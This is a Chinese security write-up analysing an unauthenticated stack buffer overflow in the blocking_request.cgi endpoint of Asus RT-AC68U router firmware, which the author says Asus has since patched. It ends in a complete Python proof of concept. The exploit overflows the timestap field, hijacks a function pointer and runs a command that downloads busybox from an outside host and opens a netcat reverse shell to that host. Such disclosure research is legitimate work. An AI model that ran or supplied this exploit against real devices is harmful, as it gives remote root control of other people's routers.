# Asus 路由器栈溢出漏洞分析
> ChaMd5
> 来源：https://www.iotsec-zone.com/article/118

0x0 前言
------

我在AC68U RT-AC68U\_3.0.0.4\_384\_45713-g0f2983e.trx固件版本中发现了2个漏洞：

*   **漏洞①：blocking\_request.cgi 高危**

攻击者可在未登陆验证的情况下进行缓冲区溢出达到任意命令执行效果

*   **漏洞②：blocking.cgi 低危**

原理同漏洞①但是经测试，无法达到任意命令执行效果，但是攻击后会将设备打崩陷入无限重启

华硕已经确认了该漏洞，不过该漏洞已经进行了修复，回复如下图：
![0.png](https://www.iotsec-zone.com/images/MdImg/ab2d06192cc363db6fa68c93d2bd038c.png)


  

0x1 漏洞影响范围
----------

*   AC68U FirmwareVersion < 3.0.0.4.385.20633

*   RT-AC5300 FirmwareVersion <3.0.0.4.384.82072

. . . . . .

此漏洞影响很多型号，具体型号暂未统计，官方2020年8-9月份修复的RCE漏洞（如下图）似乎就是这个

![1.png](https://www.iotsec-zone.com/images/MdImg/48c6074ff23ec14239c26598442abf62.png)

0x2 前期准备
--------

*   设备：AC68U美版一台（建议买国行的，由于存在CFE限制，刷固件容易出问题）

*   固件下载：[https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RTAC68U/HelpDesk\_BIOS/](https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RTAC68U/HelpDesk\_BIOS/)

0x3 漏洞挖掘
--------

asuswrt-merlin/web.c at master · RMerl/asuswrt-merlin (github.com)

参考梅林固件httpd服务源代码可找到URI处理接口结构体,具体如下

```c
struct mime_handler {
 char *pattern;                                                   //接口名称
 char *mime_type;                                                 //Accept格式
 char *extra_header;                                              //Cache-Control
 void (*input)(char *path, FILE *stream, int len, char *boundary);//获取data中内容
 void (*output)(char *path, FILE *stream);                        //处理函数
 void (*auth)(char *userid, char *passwd, char *realm);           //校验权限
};

```

![2.png](https://www.iotsec-zone.com/images/MdImg/b74399352b7013bde3b2d551cddb6088.png)

  

通过相关敏感函数定位到了以下2个URI接口，并且可以得出信息：

①blocking\_request.cgi 接口处理函数未进行权限校验

②blocking.cg i接口处理函数会进行权限校验

![3.png](https://www.iotsec-zone.com/images/MdImg/149052659e40d393284d2481ce7fdce4.png)

  

54行构造参数满足条件满足结果为真：

1.  系统时间戳+3600-timestap参数<20。所以timestap的参数可以通过一次空包返回内容来计算时间戳（注意需要根据设备系统设置时区计算）

![4.png](https://www.iotsec-zone.com/images/MdImg/577e176a70573f70f8c214da18f88a75.png)

  

1.  sub\_11840函数执行nvram\_get操作，也就是nvram\_get("MULTIFILTER\_MAC"),默认为空，也就是strstr("",mac参数)，所以mac参数必须为空

跳进if语句后，56行nvram\_get("MULTIFILTER\_TMP\_T")初始值为空所以在if(v11)处会跳转到84行，接着对执行拼接操作，而v4就是mac参数因为需要满足第一个if语句条件无法控制，v5是timestap参数（atol(1639469133aaaaaaa.....)返回的是1639469133），可通过timestap参数进行溢出

![5.png](https://www.iotsec-zone.com/images/MdImg/661c8c115f493bacd247d798931c5953.png)

  

0x4 漏洞利用
--------

1.  第一次尝试填充4740 \* a,查看栈中数据，还有40个字节需要填充，也就是4840\* a + p32(addr)

![6.png](https://www.iotsec-zone.com/images/MdImg/c8c6a726619bd36fe63a02a56e507bf0.png)

  

1.  但是实际测试中会提前崩溃，逐步调试，发现崩溃点位于98行json\_object\_put函数，此函数参数会从栈上取数据，而栈被覆盖了后取的数据导致提前崩溃

![7.png](https://www.iotsec-zone.com/images/MdImg/7bacb61f9690b8023aa18f9cb819065a.png)

  

1.  查看json\_object\_put函数原型，a1就是栈上取的参数，也就是只有当满足条件a1=0 或 \*(a1+12)-- != 1 才能保持正常返回。由于是strcat函数导致溢出，栈中数据出现00会截断。注意下图左边汇编代码，LDR是取内容，--后比较完后会通过STR指令将内容写回原地址，所以该地址必须满足条件：可读、可写、无00

![8.png](https://www.iotsec-zone.com/images/MdImg/e0be9e3d0e9e10d8c39e0512d52b778c.png)

  

1.  寻找合适地址

*   查看区段信息，未发现所需地址

*   查看lib库，开启了PIE，无法利用 （碰撞libc地址概率太低不进行尝试了）

![9.png](https://www.iotsec-zone.com/images/MdImg/521a3ae8d5ef05df1d564a2c9359e5c0.png)

![10.png](https://www.iotsec-zone.com/images/MdImg/f69ac28ab7f890f22bc42d8d82be7577.png)

1.  所以溢出覆盖到返回地址的路是走不通的，但是注意看该函数内竟然有一个函数指针，而a1的值是可控的，也就是不用覆盖到返回地址也可以劫持PC

![11.png](https://www.iotsec-zone.com/images/MdImg/47cffe15c8e69c230d581ba6256d0ad8.png)

  

1.  观察bss段数据 发现CName、mac、interval、timestap内容都存在bss段，且bss段可读可写。

构造结构如下图，且运行到json\_object\_put函数内，准备跳转前，发现R10的内容保存的是CName参数内容。

注：方式不唯一，自己构造即可

```bash
#cmd：需要执行的命令
#timeStapStr：计算好的时间戳
#addr：interval参数内容首地址，需要根据cmd命令的长度进行调整
'CName': cmd，
'mac': '',
'interval': 'a'*12+p32(1)+'a'*16+p32(0x0000EFA8),
'timestap': timeStapStr +'a'*4740+p32(addr)

```

![12.png](https://www.iotsec-zone.com/images/9437dcc679207f89a21a4851ca9662d8.png)

  

0x5 POC
-------

POC需要根据不同版本调整

以下是针对3.0.0.4.384.45713固件版本的POC，这里放出一个不会根据执行命令进行自行调整的poc

```python
#coding=utf-8
from pwn import *
import re
import time
import requests
import urlparse
import urllib3
urllib3.disable_warnings()
import sys

def rematch(strTmp):
    tm_year = strTmp[0][2]
    tm_month = strTmp[0][1]
    tm_day = strTmp[0][0]
    tm_hour = strTmp[0][3]
    tm_min = strTmp[0][4]
    tm_sec = strTmp[0][5]
    if tm_month == 'Jan':
        tm_month = '01'
    if tm_month == 'Feb':
        tm_month = '02'
    if tm_month == 'Mar':
        tm_month = '03'
    if tm_month == 'Apr ':
        tm_month = '04'
    if tm_month == 'May':
        tm_month = '05'
    if tm_month == 'Jun':
        tm_month = '06'
    if tm_month == 'Jul':
        tm_month = '07'
    if tm_month == 'Aug':
        tm_month = '08'
    if tm_month == 'Sept':
        tm_month = '09'
    if tm_month == 'Oct':
        tm_month = '10'
    if tm_month == 'Nov':
        tm_month = '11'
    if tm_month == 'Dec':
        tm_month = '12'
    tm_hour = int(tm_hour) + 8
    time_tmp = '{}-{}-{} {}:{}:{}'.format(tm_year, tm_month, tm_day, tm_hour, tm_min, tm_sec)
    print(time_tmp)
    ts = time.strptime(time_tmp, "%Y-%m-%d %H:%M:%S")
    timeStamp= int(time.mktime(ts))
    return timeStamp

def getTime(url):
    scheme =  urlparse.urlparse(url).scheme
    hostname = urlparse.urlparse(url).hostname
    header={
        'Host': hostname,
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': scheme+'://'+hostname,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': scheme+'://'+hostname,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection':'close'
    }
    data1 ={
        'CName': '',
        'mac': '',
        'interval': '',
        'timestap': '',
    }
    url = url+'/blocking_request.cgi'
    ret = requests.post(url = url ,
                  headers = header,
                  data = data1,
                  verify=False)
    format_time =''
    for key, value in (ret.headers).items():
        if 'Date' in key:
            format_time = value
    tmp = re.findall(r', (.*?) (.*?) (.*?) (.*?):(.*?):(.*?) GMT',format_time)
    timeStap = rematch(tmp) + 3600
    timeStapStr = str(timeStap)
    print(timeStapStr)
    data2 ={
        'CName': 'cd /tmp/home/root;wget http://192.168.2.177:8080/busybox-armv6l;chmod 777 *;./busybox-armv6l nc 192.168.2.177:1234 -e /bin/ash',
        'mac': '',
        'interval': 'a'*12+p32(1)+'a'*16+p32(0x0000EFA8),
        'timestap': timeStapStr +'a'*4740+p32(0x0006FE35), #p32(0x0006FE35) 此addr为interval参数内容首地址

    }
    ret = requests.post(url = url ,
                  headers = header,
                  data = data2,
                  verify=False,)
    print('End')

if __name__ == '__main__':
    url = sys.argv[1]
    getTime(url)
```

0x6 漏洞演示
--------
[演示视频](http://mpvideo.qpic.cn/0bc35madcaaaf4anfdzxbbrfb26dghvqamia.f10002.mp4?dis_k=82b9820134904ace60c1a4e26904a400&dis_t=1648013216&vid=wxv_2319243509460942851&format_id=10002&support_redirect=0&mmversion=false "演示视频")
![13.png](https://www.iotsec-zone.com/images/MdImg/54841a520148823fd53c09a3db1088b7.png)

